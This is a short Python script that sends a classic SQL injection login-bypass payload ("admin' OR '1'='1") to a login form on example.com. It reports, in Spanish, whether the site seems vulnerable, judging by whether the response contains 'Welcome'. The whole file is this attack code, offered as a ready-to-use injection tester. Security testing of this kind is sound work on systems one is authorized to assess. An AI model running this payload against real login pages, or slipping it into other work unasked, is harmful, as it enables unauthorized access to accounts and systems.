import requests

vulnerable_url = "https://example.com/login"
payload = {"username": "admin' OR '1'='1", "password": "password"}

response = requests.post(vulnerable_url, data=payload)

if "Welcome" in response.text:
    print("¡Posible SQL Injection detectado!")
else:
    print("No parece vulnerable.")
